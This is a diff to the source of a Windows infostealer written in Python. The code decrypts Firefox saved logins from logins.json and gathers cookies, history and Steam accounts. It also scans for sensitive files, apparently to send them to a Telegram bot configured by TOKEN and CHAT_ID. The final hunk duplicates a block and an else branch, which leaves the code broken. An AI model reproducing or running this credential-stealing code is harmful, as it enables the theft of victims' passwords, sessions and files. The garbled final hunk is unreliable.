@@ -14,26 +14,20 @@ import requests
 import platform
 import winreg
 import json
-import hashlib
 import hmac
 import zipfile
-import xml.etree.ElementTree as ET
 import aiohttp, psutil, win32api # type: ignore
 
 from typing import List
-from urllib.request import Request, urlopen
 from pathlib import Path
 from ctypes import *
 from datetime import datetime, time
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
-from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend # type: ignore
 from Crypto.Cipher import DES3, AES # type: ignore
-from Crypto.Protocol.KDF import PBKDF2 # type: ignore
 from base64 import b64decode
 from hashlib import sha1, pbkdf2_hmac
 from pyasn1.codec.der.decoder import decode # type: ignore
-from win32crypt import CryptUnprotectData
 
 TOKEN = "%TOKEN%"
 CHAT_ID = "%CHAT_ID%"
@@ -268,7 +262,7 @@ class get_data:
 
         taskk = [
             asyncio.create_task(self.GetGeckoAutoFills()),
-            asyncio.create_task(self.GetGeckoPasswords()),
+            asyncio.create_task(self.GetGeckoLogins()),
             asyncio.create_task(self.GetGeckoCookies()),
             asyncio.create_task(self.GetGeckoHistorys()),
             asyncio.create_task(self.StealSteamUser()), 
@@ -312,32 +306,35 @@ class get_data:
         except Exception as Error:
             logs_handler(f"[ERROR] - getting gecko profiles: {str(Error)}")
 
-
-
-    async def GetGeckoPasswords(self):
+    async def GetGeckoProfiles(self) -> None:
         try:
-            for files in self.GeckoFilesFullPath:
-                if "logins.json" in files:
-                    passwords = []
-                    key = GeckoDecryptionApi.get_key(files, master_password)
-                    if key is None:
-                        return passwords
+            profiles_path = os.path.join(self.GeckoFilesFullPath, "profiles.ini")
+            with open(profiles_path, "r") as f:
+                data = f.read()
+            profiles = [
+                os.path.join(self.GeckoFilesFullPath.encode("utf-8"), p.strip()[5:].encode("utf-8")).decode("utf-8")
+                for p in re.findall(r"^Path=.+(?s:.)$", data, re.M)
+            ]
+        except Exception:
+            profiles = []
 
-                    logins_path = os.path.join(files, "logins.json")
-                    if os.path.exists(logins_path):
-                        with open(logins_path, 'r', encoding='utf-8', errors="ignore") as f:
-                            logins_data = json.load(f)
-                        
-                        for login in logins_data['logins']:
-                            decoded_username = GeckoDecryptionApi.decode_login_data(login['encryptedUsername'])
-                            decoded_password = GeckoDecryptionApi.decode_login_data(login['encryptedPassword'])
-                            username = GeckoDecryptionApi.decrypt(decoded_username['data'], decoded_username['iv'], key, 'DES3')
-                            password = GeckoDecryptionApi.decrypt(decoded_password['data'], decoded_password['iv'], key, 'DES3')
-                            passwords.append({'hostname': login['hostname'], 'username': username.decode(), 'password': password.decode(), 'lastUsed': login['timeLastUsed'],})
-            
-                    self.GeckoPasswordsList.appendt(f"{passwords}\n")
+        return profiles
+
+    async def GetGeckoLogins(self) -> None:
+        try:
+            Profiles = await self.GetGeckoProfiles()
+            with open(os.path.join(Profiles, "logins.json"), "r", encoding="utf-8", errors="ignore") as f:
+                json_logins = json.load(f)
+                for row in json_logins.get("logins", []):
+                    host, enc_user, enc_pass = row["hostname"], row["encryptedUsername"], row["encryptedPassword"]
+                    key = GeckoDecryptionApi.getKey(Path(Profiles))
+                    username = GeckoDecryptionApi.decodeLoginData(key, enc_user)
+                    password = GeckoDecryptionApi.decodeLoginData(key, enc_pass)
+                    if username and password:
+                        self.GeckoPasswordsList.append(f"URL: {host}\nUsername: {username}\nPassword: {password}\nApp: Mozilla\nProfile: {Profiles}\n")
         except Exception as Error:
-            logs_handler(f"Error getting Gecko Passwords: {str(Error)}")
+            logs_handler(f"Error reading gecko password login data: {str(Error)}")
+            pass
 
     async def GetGeckoCookies(self) -> None:
         try:
@@ -3128,6 +3125,10 @@ if __name__ == '__main__':
         main = get_data()
         asyncio.run(main.RunAllFonctions())
 
+        files = StealFiles()
+        asyncio.run(files.check_sensitive_files())
+    else:
+        print("run only on windows operating system")
         files = StealFiles()
         asyncio.run(files.check_sensitive_files())
     else:
